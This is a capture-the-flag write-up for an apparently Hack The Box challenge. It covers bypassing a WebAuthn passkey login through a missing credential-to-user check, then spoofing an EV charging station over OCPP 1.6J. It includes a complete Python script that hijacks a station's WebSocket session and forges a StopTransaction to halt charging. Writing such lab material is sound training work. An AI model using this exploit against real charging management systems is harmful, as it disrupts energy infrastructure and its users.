![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /><font size='10'>VoltGrid CSMS</font>

14<sup>th</sup> Apr 2026

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='green'>Medium</font>

<br><br>

# Synopsis

- Bypass a modern WebAuthn (Passkey) login by exploiting a credential binding validation flaw.
- Hijack an active OCPP 1.6J WebSocket connection for a charging station.
- Forge a `StopTransaction` event to halt energy delivery to the target.

## Description

Below the threshold of war, critical infrastructure is the bargaining surface. Infiltrate the VoltGrid CSMS to sever state-backed proxy access. Demonstrate your control by halting the active transaction at Monastiraki Station for exactly one minute.

## Skills Required

- Understanding of WebAuthn and Passkey protocols.
- Basic familiarity with WebSocket communications and the OCPP specification.

# Solution

# Stage 1: The Passkey Bypass

## Step 1: Connecting via the Secure Proxy

The challenge provides a `note.txt` file and a `proxy.py` script in the release. Unlike traditional passwords, Passkeys (WebAuthn) strictly require a "secure context" to function. Modern browsers will outright refuse to trigger the passkey prompt if the site isn't loaded over HTTPS, with one convenient exception: `localhost`.

Instead of struggling with self-signed SSL certificates, the provided proxy script forwards connections from our local loopback interface directly to the challenge container. We spin it up like so:

```bash
python3 proxy.py <IP> <PORT> --local-port 8080
```

By navigating to `http://voltgrid.localhost:8080`, our browser treats the connection as secure, allowing the WebAuthn flow to execute gracefully.

## Step 2: Reconnaissance on the Authentication Portal

Landing on the VoltGrid Admin Panel, we immediately notice there's no password field. The only option is **"Sign in with your Passkey"**. The page also helpfully mentions it is "Secured with WebAuthn / FIDO2" and drops a massive hint: "OCPP 1.6J". 

Since there's no registration button on the UI, we turn to `ffuf` to hunt for hidden endpoints:

```bash
ffuf -u http://voltgrid.localhost:8080/FUZZ -w ~/wordlists/seclist/Discovery/Web-Content/common.txt 
```

This quickly yields a hit for `/register`. Perfect!

## Step 3: Understanding Passkeys and the Vulnerability

Before we exploit the login, it helps to understand what Passkeys actually do behind the scenes.

At a high level:
1. **Registration:** When you register, the server gives you a unique challenge. Your browser generates a public/private key-pair, saves the private key safely in your device, and sends the public key back to the server along with a unique identifier known as a `credential_id`.
2. **Login:** When you try to log in, the server gives you another challenge and the `credential_id` it has on file for your user. It tells the browser, "Hey, sign this with the private key corresponding to this identifier." The browser signs it, and the server verifies the signature using the public key it stored during registration.

So, where does our challenge go wrong?

We register a dummy account at `/register` using our own passkey (like Windows Hello or Google Password Manager). The backend successfully stores our public key and our `credential_id`.

If we log in using this newly created dummy account, the authentication is successful, but we hit a dead end: we are greeted with a "403 Forbidden" error because our session lacks the admin privileges required to view the VoltGrid dashboard.

However, if we return to the main portal and attempt to log in as `admin` instead, the server prompts us to authenticate. If we provide the passkey we *just* generated for our dummy account, we inexplicably log in successfully as the admin!

**The Flaw:**
The backend verifies the cryptographic signature perfectly—proving the math is correct. However, **it completely forgets to verify if the supplied `credential_id` actually belongs to the requested user.** It assumes that because the credential is valid, the user must be too! We just exploited a broken association to bind our valid passkey to the `admin` session context.

# Stage 2: The OCPP WebSocket Hijack

## Step 4: Locating our Target

Now authenticated as the `admin`, we have full access to the VoltGrid Enterprise Dashboard. Our ultimate objective is to disrupt an active transaction. 

By clicking around the map and the stations list, we find our primary target: **Monastiraki Station**. The dashboard reveals two vital pieces of intelligence:
1. The station's internal UUID: `a8e1d4c9-52f7-4b3a-b6e0-9d2c8f1a7e35`
2. An active transaction is currently running with the ID `1001`.

We know the system uses OCPP 1.6J over WebSockets. We just need to find a way to interact with it.

## Step 5: Hijacking the OCPP Connection

The vulnerability in the CSMS's OCPP implementation is a classic logic flaw in poorly secured IoT environments: it identifies the charging station purely by the URL path (`ws://.../<uuid>`) and implements no secondary authentication layer (like Basic Auth or required Client Certificates).

Crucially, if a new connection comes in using a known UUID, the server blindly accepts it and drops the legitimate station's original connection. This means we can spoof the Monastiraki Station simply by connecting to its endpoint!

## Step 6: Crafting the Exploit

We can use the `ocpp` Python library to construct an exploit script that connects to the CSMS, announces itself as the station, stops the transaction, and holds the connection open for 65 seconds (the challenge requirement to prove we maintained control).

Here is the script we use:

### 1. Setup and Custom Client
We initialize an asynchronous WebSocket script and create a custom `ChargePoint` class that can send both Boot Notifications and Stop Transaction payloads.

```python
import asyncio
import logging
import websockets
from datetime import datetime, timezone

from ocpp.v16 import ChargePoint as cp
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus

logging.basicConfig(level=logging.INFO)

class ChargePointClient(cp):
    async def send_boot_notification(self):
        request = call.BootNotificationPayload(
            charge_point_vendor="ExploitClient",
            charge_point_model="1"
        )
        response = await self.call(request)

        if response.status == RegistrationStatus.accepted:
            logging.info("Connected to Central System successfully!")
        else:
            logging.warning("Central System rejected the connection.")

    async def stop_transaction(self, transaction_id):
        # We send a StopTransaction for the active TX ID we found
        request = call.StopTransactionPayload(
            transaction_id=transaction_id,
            meter_stop=99999,
            timestamp=datetime.now(timezone.utc).isoformat()
        )
        await self.call(request)
        logging.info("Stop transaction response received!")
```

### 2. The Exploit Chain
We connect specifying the `ocpp1.6` subprotocol. We initialize our client with the **UUID** of Monastiraki Station to hijack its session, boot up, and execute the `stop_transaction` method targeting ID `1001`.

```python
import argparse

async def main(ip, target_uuid, ws_port):
    uri = f"ws://{ip}:{ws_port}/{target_uuid}"
    
    async with websockets.connect(uri, subprotocols=['ocpp1.6']) as ws:
        # Crucial: Identify ourselves as the target station!
        charge_point = ChargePointClient(target_uuid, ws)

        # Run the WebSocket listener in the background
        asyncio.create_task(charge_point.start())

        # Establish our rogue connection
        await charge_point.send_boot_notification()
        
        # Halt the flow of energy
        logging.info("Attempting to stop transaction ID 1001...")
        await charge_point.stop_transaction(1001)

        # Maintain control to satisfy the victory condition
        logging.info("Holding the connection open for 65s...")
        await asyncio.sleep(65)
        
        logging.info("Done! Check the dashboard activity logs to find your flag!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP or domain")
    parser.add_argument("uuid", help="Target Station UUID")
    parser.add_argument("--ws-port", type=int, default=9000)
    args = parser.parse_args()

    try:
        asyncio.run(main(args.ip, args.uuid, args.ws_port))
    except KeyboardInterrupt:
        pass
```

Once the script holds the connection for `65` seconds, the CSMS acknowledges our sustained disruption, and we get the flag in the logs.
